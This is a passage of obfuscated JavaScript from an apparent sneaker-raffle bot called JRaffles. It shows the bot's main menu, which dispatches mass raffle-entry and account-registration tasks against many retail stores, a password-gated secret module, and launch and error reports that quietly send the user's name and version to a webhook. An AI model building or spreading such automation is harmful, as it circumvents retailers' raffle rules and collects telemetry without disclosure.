    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x2bf3e7(_0x2132e9) {
    var _0x93449c = await _0x244d38(), _0x3345d6 = _0x4a3ff4['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x348071 = _0x566459['parse'](_0x3345d6, { 'header': !![] })['data'];
    for (var _0x270246 = 0x0; _0x270246 < _0x348071['length']; _0x270246++) {
        var _0x200893 = _0x348071[_0x270246]['Store'], _0x491192 = _0x348071[_0x270246]['Mode'];
        for (var _0x271b72 of _0x5f903f) {
            const _0x2f72c5 = _0x271b72['name']['includes'](_0x200893);
            if (_0x2f72c5)
                for (mode of _0x5f903f[_0x271b72]['modules']) {
                    const _0x3ee99a = mode['name']['includes'](_0x491192);
                    _0x3ee99a && (_0x2132e9 = mode['name'], await mode['function'](_0x2132e9, _0x348071[_0x270246], _0x93449c));
                }
        }
    }
}
async function _0x2d85e1() {
    await _0x4d056c(), console['clear'](), _0x579cef['threads'] = 0x1;
    if (_0x4a92ac != 'devkey') {
        let _0x37fe21 = await _0x3a4d09['autoUpdate']();
        if (_0x37fe21 === 'yes')
            return _0x8f1fe9('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x115a3b == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0xaebb71(0x2710);
        ;
    }
    await _0x188c66(_0x115a3b);
    if (_0x18efdc === ![])
        return console['log']('Closing\x20Browser'), await _0xaebb71(0xbb8);
    else
        try {
            var _0x5d7f2d = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x3f93ac
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x4a92ac
                    }
                ]
            }];
            const _0x56ef27 = { 'embeds': _0x5d7f2d };
            var _0x4ab3f0 = await _0x3ead77(null, null, 'open', ![]);
            const _0x3b0f60 = { 'openDEVMSG': { 'embeds': [_0x4ab3f0] } };
            await _0x4401f2(_0x5aea19, _0x3b0f60['openDEVMSG']);
            async function _0x51cc99() {
                _0x3e0125('JRaffles\x20' + _0x4a92ac), console['clear'](), console['log']('Hello\x20' + _0x218a39['cyan']('' + _0x3f93ac) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x4a92ac), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x2d64e9 = 0x0; _0x2d64e9 < _0x5f903f['length'] - 0x4; _0x2d64e9++) {
                    if (_0x2d64e9 >= 0xa) {
                        console['log']('\x20(' + _0x2d64e9 + ')\x20[' + _0x5f903f[_0x2d64e9]['name'] + ']');
                        continue;
                    }
                    if (_0x5f903f[_0x2d64e9]['name'] === 'Reload\x20Settings' || _0x5f903f[_0x2d64e9]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x2d64e9 + ')\x20\x20[' + _0x5f903f[_0x2d64e9]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x5f903f['length'] - 0x4) + ')\x20Failed\x20Tasks'), console['log']('\x20(' + (_0x5f903f['length'] - 0x3) + ')\x20Paypal\x20Verification'), console['log']('\x20(' + (_0x5f903f['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x5f903f['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x3175fb();
                if (taskModule > _0x5f903f['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0xaebb71(0x3e8), _0x51cc99();
                if (_0x5f903f[taskModule]['name'] == 'BSTN') {
                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    try {
                        if (taskFunction == 0x3) {
                            var _0x27c694 = await _0x244d38();
                            await _0x2acbf4['function'](_0x2acbf4, _0x27c694);
                        }
                        if (taskFunction == 0x2) {
                            var _0x27c694 = await _0x244d38(), _0x4c5d9d = await _0x54af71(_0x2acbf4);
                            _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4c5d9d), await _0x2acbf4['function'](_0x2acbf4, _0x4c5d9d, _0x27c694);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27c694 = await _0x244d38(), _0x4c5d9d = await _0x54af71(_0x2acbf4);
                                _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4c5d9d), await _0x2acbf4['function'](_0x2acbf4, _0x4c5d9d, _0x27c694);
                            } else {
                                if (taskFunction == 0x1) {
                                    var _0x27c694 = await _0x244d38();
                                    await _0x2acbf4['function'](_0x2acbf4, _0x27c694);
                                }
                            }
                        }
                    } catch (_0x220957) {
                        console['log'](_0x220957), await _0xaebb71(0x7d0);
                    }
                    return _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == 'FENOM') {
                    try {
                        taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                        var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x27c694 = await _0x244d38(), _0x967084 = await _0x54af71(_0x2acbf4);
                            _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x967084), await _0x2acbf4['function'](_0x2acbf4, _0x967084, _0x27c694);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27c694 = await _0x244d38(), _0x967084 = await _0x54af71(_0x2acbf4);
                                _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x967084), await _0x2acbf4['function'](_0x2acbf4, _0x967084, _0x27c694);
                            }
                        }
                    } catch (_0x3ccb8b) {
                        console['log'](_0x3ccb8b), await _0xaebb71(0xfa0);
                    }
                    return _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == 'Overkill') {
                    try {
                        taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                        var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x1) {
                            var _0x27c694 = await _0x244d38(), _0x967084 = await _0x54af71(_0x2acbf4);
                            _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x967084), await _0x2acbf4['function'](_0x2acbf4, _0x967084, _0x27c694);
                        } else {
                            if (taskFunction == 0x0) {
                                var _0x27c694 = await _0x244d38(), _0x967084 = await _0x54af71(_0x2acbf4);
                                _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x967084), await _0x2acbf4['function'](_0x2acbf4, _0x967084, _0x27c694);
                            }
                        }
                    } catch (_0x27725b) {
                        console['log'](_0x27725b), await _0xaebb71(0xfa0);
                    }
                    return _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == '4ELEMENTOS') {
                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    if (taskFunction == 0x1) {
                        var _0x27c694 = await _0x244d38();
                        return await _0x2acbf4['function'](_0x2acbf4, _0x27c694), _0x51cc99();
                    }
                    var _0x27c694 = await _0x244d38(), _0x5c9fcf = await _0x54af71(_0x2acbf4);
                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x5c9fcf), await _0x2acbf4['function'](_0x2acbf4, _0x5c9fcf, _0x27c694), _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == 'OneBlockDown') {
                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27c694 = await _0x244d38(), _0x5c9fcf = await _0x54af71(_0x2acbf4);
                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x5c9fcf), await _0x2acbf4['function'](_0x2acbf4, _0x5c9fcf, _0x27c694), _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27c694 = await _0x244d38(), _0x5c9fcf = await _0x54af71(_0x2acbf4);
                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x5c9fcf), await _0x2acbf4['function'](_0x2acbf4, _0x5c9fcf, _0x27c694), _0x51cc99();
                }
                if (_0x5f903f[taskModule]['name'] == 'EQL') {
                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x27c694 = await _0x244d38(), _0x5c9fcf = await _0x54af71(_0x2acbf4);
                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x5c9fcf), await _0x2acbf4['function'](_0x2acbf4, _0x5c9fcf, _0x27c694), _0x51cc99();
                } else {
                    if (_0x5f903f[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                        var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                        console['clear']();
                        if (taskFunction == 0x0) {
                            var _0x27c694 = await _0x244d38(), _0x2091a8 = await _0x54af71(_0x2acbf4);
                            return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2091a8), await _0x2acbf4['function'](_0x2acbf4, _0x2091a8, _0x27c694), _0x51cc99();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x27c694 = await _0x244d38();
                                return await _0x2acbf4['function'](_0x2acbf4, null, _0x27c694), _0x51cc99();
                            }
                        }
                        ;
                    } else {
                        if (_0x5f903f[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                            var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction], _0x27c694 = await _0x244d38(), _0x4355e9 = await _0x54af71(_0x2acbf4);
                            return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4355e9), await _0x2acbf4['function'](_0x2acbf4, _0x4355e9, _0x27c694), await _0xaebb71(0x1388), _0x51cc99();
                        } else {
                            if (_0x5f903f[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x27c694 = await _0x244d38(), _0x2091a8 = await _0x54af71(_0x2acbf4);
                                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2091a8), await _0x2acbf4['function'](_0x2acbf4, _0x2091a8, _0x27c694), _0x51cc99();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x27c694 = await _0x244d38();
                                        return await _0x2acbf4['function'](_0x2acbf4, null, _0x27c694), _0x51cc99();
                                    }
                                }
                                ;
                            } else {
                                if (_0x5f903f[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await bwAcc('https://bouncewear.com/nl/account/register', _0x2acbf4);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x5f903f[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                        var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x27c694 = await _0x244d38(), _0x2a3d0b = await _0x54af71(_0x2acbf4);
                                            return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2a3d0b), await _0x2acbf4['function'](_0x2acbf4, _0x2a3d0b, _0x27c694), _0x51cc99();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x27c694 = await _0x244d38(), _0x2a3d0b = await _0x54af71(_0x2acbf4);
                                                return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2a3d0b), await _0x2acbf4['function'](_0x2acbf4, _0x2a3d0b, _0x27c694), _0x51cc99();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x5f903f[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                            var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x27c694 = await _0x244d38(), _0x2649ab = await _0x54af71(_0x2acbf4);
                                                return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2649ab), await _0x2acbf4['function'](_0x2acbf4, _0x2649ab, _0x27c694), _0x51cc99();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x27c694 = await _0x244d38(), _0x2649ab = await _0x54af71(_0x2acbf4);
                                                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x2649ab), await _0x2acbf4['function'](_0x2acbf4, _0x2649ab, _0x27c694), _0x51cc99();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x5f903f[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                                var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x27c694 = await _0x244d38(), _0x4bc470 = await _0x54af71(_0x2acbf4);
                                                    return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4bc470), await _0x2acbf4['function'](_0x2acbf4, _0x4bc470, _0x27c694), _0x51cc99();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x27c694 = await _0x244d38(), _0x4bc470 = await _0x54af71(_0x2acbf4);
                                                        return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4bc470), await _0x2acbf4['function'](_0x2acbf4, _0x4bc470, _0x27c694), _0x51cc99();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x5f903f[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                                    var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x27c694 = await _0x244d38(), _0x4d1536 = await _0x54af71(_0x2acbf4);
                                                        return _0x579cef['shuffleTasks'] && await _0x3ae1e2(_0x4d1536), await _0x2acbf4['function'](_0x2acbf4, _0x4d1536, _0x27c694), _0x51cc99();
                                                    }
                                                } else {
                                                    if (_0x5f903f[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0xaebb71(0x3e8), _0x51cc99();
                                                    else {
                                                        if (_0x5f903f[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x47182e = _0x5f903f[taskModule]['name'], _0x27c694 = await _0x244d38();
                                                            return await _0x4e2ba6(_0x47182e, _0x27c694), _0x51cc99();
                                                        } else {
                                                            if (_0x5f903f[taskModule]['name'] == 'Failed\x20Tasks') {
                                                                taskFunction = await _0xcb20c7(_0x5f903f[taskModule]['modules']);
                                                                var _0x2acbf4 = _0x5f903f[taskModule]['modules'][taskFunction];
                                                                return await _0x2acbf4['function'](_0x2acbf4), _0x51cc99();
                                                            } else {
                                                                if (_0x5f903f[taskModule]['name'] == 'Change\x20Settings') {
                                                                    console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                    var _0x441668 = 0x0;
                                                                    for (const _0x38a7d2 in _0x579cef) {
                                                                        console['log']('(' + _0x441668 + ')\x20' + _0x38a7d2 + '\x20:\x20' + _0x579cef[_0x38a7d2]), _0x441668++;
                                                                    }
                                                                    console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x441668 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                    var _0xf34a1 = await _0x55ed9c();
                                                                    if (_0xf34a1 == _0x441668)
                                                                        return _0x51cc99();
                                                                    console['clear'];
                                                                    var _0x3d2837 = 0x0;
                                                                    for (var _0x50ec80 in _0x579cef) {
                                                                        if (_0xf34a1 == _0x3d2837) {
                                                                            console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x50ec80 + '\x20:'), _0x579cef[_0x50ec80] = await _0x1cb637(), _0x4a3ff4['writeFileSync']('../settings.json', JSON['stringify'](_0x579cef));
                                                                            break;
                                                                        } else
                                                                            _0x3d2837++;
                                                                    }
                                                                    return console['log']('Settings\x20Saved!'), await _0xaebb71(0xbb8), _0x51cc99();
                                                                } else {
                                                                    if (_0x5f903f[taskModule]['name'] == 'Reload\x20Settings')
                                                                        return console['log']('Reloading\x20settings'), await _0x4d056c(), _0x51cc99();
                                                                    else {
                                                                        if (taskModule == 0x45) {
                                                                            _0x5f903f[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                            var _0x4603c4 = await _0x36a717();
                                                                            _0x4603c4 == 'ModuleVoorDeBoys' ? (await afewScraper(), await _0x25067c(), await afewFunction(_0x30b356[_0x3f3214], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0xaebb71(0xbb8));
                                                                        } else {
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            try {
                await _0x51cc99();
            } catch (_0xbbcf82) {
                return console['log'](_0xbbcf82), _0x51cc99();
            }
        } catch (_0x6e4f27) {
            return console['log'](_0x6e4f27), await _0xaebb71(0x3a98);
        }
}
;
_0x3e0125('JRaffles\x20' + _0x4a92ac), _0x4d056c();
try {
    _0x2d85e1();
} catch (_0x1c731d) {
    var _0x212ea4 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x3f93ac
            },
            {
                'name': 'Version',
                'value': '' + _0x4a92ac
            },
            {
                'name': 'Error',
                'value': '' + _0x1c731d
            }
        ]
    }];
    const _0x329c44 = { 'embeds': _0x212ea4 };
    _0x4401f2(_0x2631ac, _0x329c44);
}